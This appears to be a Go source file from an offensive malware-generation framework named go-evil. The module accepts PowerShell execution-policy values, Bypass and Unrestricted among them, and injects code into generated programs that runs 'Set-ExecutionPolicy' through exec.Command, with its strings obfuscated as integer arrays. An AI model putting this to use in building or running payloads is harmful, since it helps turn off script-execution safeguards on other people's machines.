package policy

import (
	"fmt"

	"github.com/s9rA16Bf4/go-evil/utility/structure/functions"
	"github.com/s9rA16Bf4/go-evil/utility/structure/json"
	"github.com/s9rA16Bf4/go-evil/utility/tools"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

func Set_execution(value string, data_object *json.Json_t) []string {
	value = tools.Erase_delimiter(value, []string{"\""}, -1)

	function_call := "set_execution_policy"
	possible_policys := []string{"AllSigned", "Bypass", "Default", "RemoteSigned", "Restricted", "Undefined", "Unrestricted"}

	found := false
	for _, policy := range possible_policys {
		if policy == value {
			found = true
		}
	}

	if !found {
		notify.Error(fmt.Sprintf("The policy '%s' is not known", value), "powershell.set_execution_policy()")
	}

	data_object.Add_go_function(functions.Go_func_t{Name: function_call, Func_type: "", Part_of_struct: "", Return_type: "",
		Parameters: []string{"repr_1 []int"},
		Gut: []string{
			"policy := spine.variable.get(spine.alpha.construct_string(repr_1))",
			"err := exec.Command(\"powershell\", \"Set-ExecutionPolicy\", policy).Run()",
			"if err != nil{",
			"spine.log(err.Error())",
			"}",
		}})

	data_object.Add_go_import("os/exec")
	parameter_1 := data_object.Generate_int_array_parameter(value)

	return []string{fmt.Sprintf("%s(%s)", function_call, parameter_1)}
}
